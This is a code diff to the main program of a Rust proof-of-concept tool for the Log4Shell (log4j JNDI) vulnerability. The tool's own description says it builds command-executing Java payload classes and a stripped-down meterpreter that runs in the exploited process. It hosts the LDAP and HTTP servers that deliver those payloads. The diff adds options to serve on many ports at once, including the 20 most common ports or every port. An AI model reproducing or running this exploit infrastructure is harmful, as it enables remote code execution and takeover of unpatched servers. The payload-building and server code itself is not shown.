@@ -6,7 +6,7 @@ mod build_java;
 mod common;
 mod multiplexed;
 
-use common::{ServerCfg, BuildCmdCfg};
+use common::{RunServerCfg, BuildCmdCfg};
 use std::fs;
 use get_if_addrs::{IfAddr, get_if_addrs};
 use clap::{Arg, App, ArgMatches};
@@ -18,7 +18,6 @@ async fn main() -> () {
         .author("Walter Szewelanczyk. <walterszewelanczyk@gmail.com>")
         .about("This is a Rust based POC to show the \"Log4Shell\" vulnerability in log4j.  This can create command based jars for exploiting and also has a stripped down meterpreter class that will run in a thread of the exploited process.  This hosts the ldap server and the http server from the same port.")
         .subcommand(App::new("build")
-//            .short_flag('b')
             .about("Build java class payload")
             .arg(Arg::new("class_name")
                 .long("class_name")
@@ -46,7 +45,6 @@ async fn main() -> () {
                 .help("the dir to build the payloads.  Will create if it doesn't exist.  Shoudl use same dir as www_root in run_servers.")
             ))
         .subcommand(App::new("run")
- //           .short_flag('r')
             .about("Run the ldap and http servers")
             .arg(Arg::new("addr")
                 .long("addr")
@@ -54,12 +52,32 @@ async fn main() -> () {
                 .default_value("")
                 .takes_value(true)
                 .help("The http address to publish")
-            ).arg(Arg::new("port")
-                .long("port")
+            ).arg(Arg::new("ports")
+                .long("ports")
                 .short('p')
-                .default_value("8080")
+                .default_value("")
                 .takes_value(true)
-                .help("The port used to server the LDAP and HTTP requests from.")
+                .help("The ports used to server the LDAP and HTTP requests from.")
+            ).arg(Arg::new("Op")
+                .long("Op")
+                .takes_value(true)
+                .help("The name of the file to write the opened ports to.")
+            ).arg(Arg::new("Of")
+                .long("Of")
+                .takes_value(true)
+                .help("The name of the file to write the failed ports to.")
+            ).arg(Arg::new("pF")
+                .long("pF")
+                .takes_value(true)
+                .help("Load ports from a file.  Expects one port per line.")
+            ).arg(Arg::new("pALL")
+                .long("pALL")
+                .takes_value(false)
+                .help("Use all available ports.  Note : this will open thousands of ports and may hit open file limits.")
+            ).arg(Arg::new("pC20")
+                .long("pC20")
+                .takes_value(false)
+                .help("Use the 20 common ports.")
             ).arg(Arg::new("wwwroot")
                 .long("wwwroot")
                 .default_value("wwwroot")
@@ -76,9 +94,9 @@ async fn main() -> () {
 
         build_java::build_exec_cmd_class(cfg).expect("faild to build cmd");
     } else if let Some(m) = matches.subcommand_matches("run"){
-        let cfg : ServerCfg = convert_args_for_run_servers(m);
+        let cfgs = convert_args_for_run_server_cfg(m);
         build_java::is_javac_installed();
-        run_servers(cfg).await;
+        run_servers(cfgs).await;
     }
 }
 
@@ -89,7 +107,6 @@ fn get_default_ip_addr_str() -> String{
     };
 
     for a in &addrs {
-//        println!("{:?}", a);
         let ip = a.ip();
         if ip.is_ipv4() &&  ip.is_global(){
             return ip.to_string() 
@@ -110,25 +127,70 @@ fn get_default_ip_addr_str() -> String{
     return "127.0.0.1".to_string();
 }
 
-
-fn convert_args_for_run_servers(m : &ArgMatches) -> ServerCfg{
-    let mut addr = m.value_of_t_or_exit("addr");
-    if addr == "" { addr = get_default_ip_addr_str(); }
+fn get_ports_from_args(m : &ArgMatches) -> Vec<u16>{
+    let ps : String = m.value_of_t_or_exit("ports");
+    let mut ports : Vec<u16> = ps.split(",")
+        .filter_map(|s| {
+            let s = s.trim();
+            if s.len() == 0 {return None};
+            Some(s.parse().expect(&format!("Error parsing port {} from --ports (-p) arg", s)))
+        })
+        .collect();
     
-    return ServerCfg{
-        web_root  : m.value_of_t_or_exit("wwwroot"),
-        addr,
-        port : m.value_of_t_or_exit("port")
+    if m.occurrences_of("pALL") > 0 {
+        (1..std::u16::MAX).for_each(|p| ports.push(p));
+    }
+
+    if m.occurrences_of("pC20") > 0 {
+        let cp20 : Vec<u16> = vec![80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111, 995, 993, 5900];
+        cp20.into_iter().for_each(|p| ports.push(p));
+    }
+
+    match m.value_of("pF") {
+        Some(file_name) => {
+           let contents = fs::read_to_string(file_name).expect(&format!("Unable to read ports file : {}", file_name)); 
+           let file_ports : Vec<u16> = contents.split("\n")
+                .filter_map(|line| {
+                    let s = line.trim();
+                    if s.len() == 0 || s.starts_with("#") {return None};
+                    Some(s.parse().expect(&format!("Error parsing port {} from file {}", s, file_name)))
+                })
+                .collect();
+            file_ports.into_iter().for_each(|p| ports.push(p));
+        },
+        None => {},
+    }
+
+    ports.sort();
+    ports.dedup();
+
+    ports
+}
+
+fn convert_option(o : Option<&str>) -> Option<String>{
+    match o {
+        Some(s) => Some(s.to_string()),
+        None => None,
     }
 }
 
-async fn run_servers(cfg : ServerCfg) -> () {
-    fs::create_dir_all(&cfg.web_root)
-        .expect(&format!("Unable to create {} dir", cfg.web_root));    
-    println!("We will send the JNDI requests the base address of http://{}:{}", &cfg.addr, &cfg.port);
-    let msf = multiplexed::start_multiplexed_server(cfg.clone());
-    tokio::join!(msf);
-    tokio::signal::ctrl_c().await.unwrap();
+fn convert_args_for_run_server_cfg(m : &ArgMatches) -> RunServerCfg{
+    let mut addr = m.value_of_t_or_exit("addr");
+    if addr == "" { addr = get_default_ip_addr_str(); }
+    RunServerCfg{
+        web_root  : m.value_of_t_or_exit("wwwroot"),
+        addr, 
+        ports : get_ports_from_args(m),
+        ports_file_name : convert_option(m.value_of("Op")),
+        failed_file_name : convert_option(m.value_of("Of")),
+    }
+}
+
+async fn run_servers(rsc: RunServerCfg) -> () {
+    fs::create_dir_all(&rsc.web_root)
+        .expect(&format!("Unable to create {} dir", rsc.web_root));    
+    println!("We will send the JNDI requests the base address of http://{}", &rsc.addr);
+    multiplexed::run_multiplexed_servers(rsc).await;
 }
 
 fn convert_args_for_build_cmd(m : &ArgMatches) -> BuildCmdCfg {
